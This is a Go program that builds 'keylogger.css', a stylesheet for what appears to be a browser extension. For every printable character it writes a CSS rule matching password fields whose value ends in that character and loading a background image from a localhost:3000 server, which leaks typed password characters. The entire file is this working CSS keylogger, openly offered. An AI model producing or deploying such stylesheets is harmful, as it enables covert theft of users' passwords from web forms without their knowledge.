package main

import (
	"fmt"
	"log"
	"net/url"
	"os"
)

func main() {
	fmt.Println("Building keylogger.css")

	output, err := os.Create("./css-keylogger-extension/keylogger.css")
	if err != nil {
		log.Fatal("Cannot create output", err)
	}
	defer output.Close()
	for c := 32; c < 128; c++ {
		value := fmt.Sprintf("%c", c)
		urlValue := url.QueryEscape(value)

		if value == `"` {
			value = `\"`
		} else if value == `}` {
			value = `\\}`
		} else if value == `\` {
			value = `\\`
		}
		fmt.Fprintf(output, `input[type="password"][value$="%v"] { background-image: url("http://localhost:3000/%v"); }`, value, urlValue)
		fmt.Fprintf(output, "\n")
	}
	fmt.Println("Complete.")
}
